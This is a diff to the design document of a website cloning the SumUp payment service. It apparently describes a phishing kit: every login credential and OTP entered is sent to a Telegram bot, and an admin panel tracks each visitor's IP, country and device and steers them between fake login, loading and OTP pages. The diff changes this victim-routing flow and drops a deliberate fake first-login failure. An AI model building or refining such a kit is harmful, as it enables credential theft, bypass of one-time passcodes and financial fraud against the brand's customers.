@@ -16,8 +16,10 @@ This project is a SumUp-inspired payment processing website clone. It features a
   - Real-time visitor list with auto-refresh every 3 seconds
   - One-click redirect buttons for each visitor
   - Shows IP, country, device, browser, current page, last seen time
-- **⚡ Automatic Redirect System**: Visitors check for redirects every 2 seconds
-- **Two-Attempt Login Flow**: First login attempt redirects to failure page, second proceeds to loading page (waits for admin redirect)
+- **⚡ Automatic Redirect System**: 
+  - Visitors check for admin redirects every 2 seconds
+  - After successful login, approval, or OTP verification → automatically redirects to loading page
+  - Loading page waits for admin redirect to next step
 - **Minimal Telegram Notifications**: Only sends login credentials (🔐) and OTP success/failure (✅/❌). Visitor tracking notifications removed.
 
 ## User Preferences
@@ -44,7 +46,7 @@ Preferred communication style: Simple, everyday language.
     - `POST /api/check-redirect`: Checks if visitor has pending redirect, returns and clears it.
 - **Telegram Bot**: Long-polling bot that handles admin commands (`/visitors`, `/redirect`, `/help`).
 - **Data Storage**: PostgreSQL database with `visitors` table tracking all visitor data and redirect targets.
-- **Authentication Flow**: Multi-step with two-attempt login, loading screen (admin controlled), OTP with 2 attempts. All credentials sent to Telegram. Admin controls all page transitions via redirect system.
+- **Authentication Flow**: Multi-step flow with automatic redirects to loading page after each successful step (login, approval, OTP). Loading screen is admin controlled - visitors wait there until admin redirects them. All credentials sent to Telegram. Admin controls all page transitions via redirect system.
 
 ### System Design Choices
 - **UI Design**: A mix of professional marketing imagery for the homepage, minimalist monochrome aesthetic for authentication flows (Login/Loading/OTP), and positive green-accented design for Success page.
